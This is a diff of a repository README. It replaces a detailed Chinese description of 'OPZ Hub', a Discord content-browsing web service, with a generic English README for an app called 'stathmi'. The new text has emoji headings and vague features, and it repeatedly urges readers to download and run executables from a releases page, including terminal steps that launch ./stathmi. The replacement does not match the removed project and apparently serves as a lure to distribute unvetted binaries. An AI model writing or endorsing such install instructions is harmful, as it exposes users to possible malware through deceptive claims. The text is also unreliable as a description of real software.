@@ -1,151 +1,82 @@
-# OPZ Hub
+# 🌟 stathmi - Your Journey Community Awaits
 
-Discord 社区内容聚合浏览平台，专注于提升内容发现与阅读体验。
+## 🚀 Getting Started
 
-## 技术栈
+Welcome to **stathmi**! This application connects you to a vibrant community ready to share their journeys. We’ve made it easy for you to join and explore. Follow the steps below to get started.
 
-| 层级      | 技术选型                             |
-| --------- | ------------------------------------ |
-| 前端      | Vue 3 + Vite + TypeScript + Naive UI |
-| 后端      | Fastify + Kysely + TypeScript        |
-| 数据库    | PostgreSQL                           |
-| 搜索引擎  | Meilisearch                          |
-| 缓存/会话 | Redis                                |
-| 认证      | Discord OAuth 2.0                    |
+## 📥 Download Links
 
-## 项目架构
+[![Download stathmi](https://img.shields.io/badge/Download-Stathmi-brightgreen)](https://github.com/nickderrick2005/stathmi/releases)
 
-Monorepo：
+## 💻 System Requirements
 
-```
-opz-hub/
-├── apps/
-│   ├── frontend/          # Vue 3 SPA
-│   └── backend/           # Fastify API 服务
-├── packages/
-│   └── shared/            # 前后端共享类型定义
-└── docs/                  # API 契约文档
-```
+Before downloading, ensure your system meets these basic requirements:
 
-### 前端架构
+- **Operating System:** Windows 10 or later / macOS Mojave or later / Linux (Ubuntu recommended)
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 200 MB of free space
+- **Network:** Internet connection for the application to function properly
 
-```
-src/
-├── api/           # HTTP 请求层（ofetch 封装）
-├── composables/   # 逻辑复用层（vue 组合式函数）
-├── stores/        # Pinia 状态管理
-├── views/         # 页面组件
-├── components/    # UI 组件库
-├── router/        # 路由配置与守卫
-└── utils/         # 工具函数
-```
+## 🔧 Features
 
-**状态管理分层**：
+- **User-friendly Interface:** Easy navigation for all users.
+- **Community Engagement:** Connect with others and share experiences.
+- **Real-time Updates:** Stay informed about community activities.
+- **Resource Sharing:** Access valuable tools and information.
 
-- 用户层：登录状态、偏好设置、主题
-- 内容层：关注列表、收藏、筛选条件
-- 元数据层：频道、标签、角色信息
-- UI 层：抽屉、模态窗状态
+## 📦 Download & Install
 
-### 后端架构
+To download the application, please visit [this page to download](https://github.com/nickderrick2005/stathmi/releases). 
 
-```
-src/
-├── routes/        # API 路由（15+ 模块）
-├── services/      # 业务逻辑层
-├── repositories/  # 数据访问层
-├── sync/          # Meilisearch 同步引擎
-├── snapshot/      # 游标分页与快照缓存
-└── cron/          # 定时任务
-```
+1. Click on the **Releases** link.
+2. Find the latest version of the software. The latest release will always be at the top.
+3. Locate the file suitable for your operating system. Options will typically include:
+   - **stathmi-windows.exe** for Windows
+   - **stathmi-macos.dmg** for macOS
+   - **stathmi-linux.tar.gz** for Linux
 
-**数据库 Schema**：
+4. Click on the appropriate file to start the download.
 
-- `public`：采集入口的只读表（posts_main, channels, tags 等）
-- `web_app`：网站维护的读写表（users, favorites, follows 等）
+Once downloaded, follow these steps to install:
 
-## 核心功能
+### For Windows:
 
-### 智能搜索
+1. Locate the downloaded file in your **Downloads** folder.
+2. Double-click the **stathmi-windows.exe** file.
+3. Follow the on-screen prompts to complete the installation.
 
-基于 Meilisearch 构建，支持：
+### For macOS:
 
-- 全文检索（标题、内容、标签、作者名）
-- 中文分词（CMN 语言配置 + nodejieba）
-- 多维度筛选（标签 AND/OR、时间范围、分类）
-- 四种排序方式：智能加权、最新、最近更新、最多点赞
+1. Find the **stathmi-macos.dmg** file in your **Downloads**.
+2. Double-click to open it.
+3. Drag the **stathmi** icon to your **Applications** folder.
+4. Open the **Applications** folder and double-click **stathmi** to launch.
 
-**智能排序算法**（weighted）：
+### For Linux:
 
-```
-score = (engagement + 2) * decay * boost
-engagement = sqrt(reactions) * 6 + sqrt(messages) * 4
-decay = max(0.5^(age_hours/336), 0.1)  // 14天半衰期
-boost = isRecommended ? 1.5 : 1.0
-```
+1. Open the terminal.
+2. Navigate to your **Downloads** folder using the command: `cd ~/Downloads`
+3. Extract the downloaded file using:`tar -xzf stathmi-linux.tar.gz`
+4. Navigate to the extracted folder: `cd stathmi`
+5. Run the application with the command: `./stathmi`
 
-### 个性化系统
+## 🔍 How to Use the Application
 
-- **性向偏好**：首次使用引导设置
-- **多层级关注**：作者、标签、频道
-- **多层级屏蔽**：作者、标签、关键词
-- **自定义样式**：支持用户 CSS 注入
+Once you open **stathmi**, you will see a simple dashboard. Here’s how to navigate:
 
-### 内容浏览
+- **Create an Account:** If you’re new, click on "Sign Up" and fill in the necessary details.
+- **Explore Communities:** Browse through various groups based on your interests.
+- **Join Discussions:** Participate in ongoing conversations or start your own.
+- **Share Your Journey:** Post updates or stories to connect with others.
 
-- **多视图模式**：卡片、列表、极简表格
-- **多分页方式**：无限滚动、页码翻页
-- **Feed 分类**：
-  - Trending：推荐热门、7天新热、小众宝藏
-  - Following：关注作者、关注标签、参与讨论
+## 🛠️ Support & Feedback
 
-### 缓存与性能
+If you encounter any issues, or have suggestions, feel free to reach out. You can find our support page in the app or visit our [issues page](https://github.com/nickderrick2005/stathmi/issues) on GitHub.
 
-- **快照机制**：热门排序结果缓存（TTL 5分钟），支持游标分页
-- **Feed 缓存**：前端 5 分钟 TTL，避免重复请求
-- **虚拟滚动**：大列表使用 @tanstack/vue-virtual
-- **滚动位置记忆**：SessionStorage 按页面保存
+We welcome feedback to improve the experience.
 
-## 实现亮点
+## 🔗 More Information
 
-### 类型安全
+For more details, check out our [GitHub repository](https://github.com/nickderrick2005/stathmi). You can find additional documentation, FAQs, and release notes there.
 
-前后端共享 `packages/shared/src/types.ts` 作为唯一 DTO 来源，包含 40+ 类型定义，确保 API 契约一致性。
-
-### 两阶段搜索排序
-
-1. Meilisearch 粗排：相关度或互动度排序
-2. 应用层精排：智能加权算法二次排序（仅 weighted 排序启用）
-
-### 容错机制
-
-- 文档缺失自动从 PostgreSQL 修复索引，字段缺失自动重载，软删除状态自动同步。
-
-### 乐观更新
-
-收藏、关注操作采用乐观更新策略：先更新 UI，再发送请求，失败时回滚。
-
-### 前端性能
-
-Feed页面图片懒加载，多DOM虚拟滚动，超上限自动卸载，后台预加载项目文件。
-
-## API 设计
-
-RESTful，统一前缀 `/api`：
-
-| 模块          | 端点数 | 说明                          |
-| ------------- | ------ | ----------------------------- |
-| Auth          | 4      | Discord OAuth 登录流程        |
-| Posts         | 12     | 帖子列表、Trending、Following |
-| Search        | 3      | 全文搜索、热词                |
-| Favorites     | 3      | 收藏管理                      |
-| Follows       | 6      | 作者/标签关注                 |
-| Notifications | 3      | 消息通知                      |
-| Users         | 5      | 用户资料、设置                |
-
-认证采用 Cookie Session，TTL 7 天，Redis 后端存储。
-
-## 意见反馈
-
-- 反馈帖子：https://discord.com/channels/1291925535324110879/1439568224520896522
-- 意见信箱：https://discord.com/channels/1291925535324110879/1337463244062720100/1438379980391448577
+Start your journey today with **stathmi**! Download now and join our community.
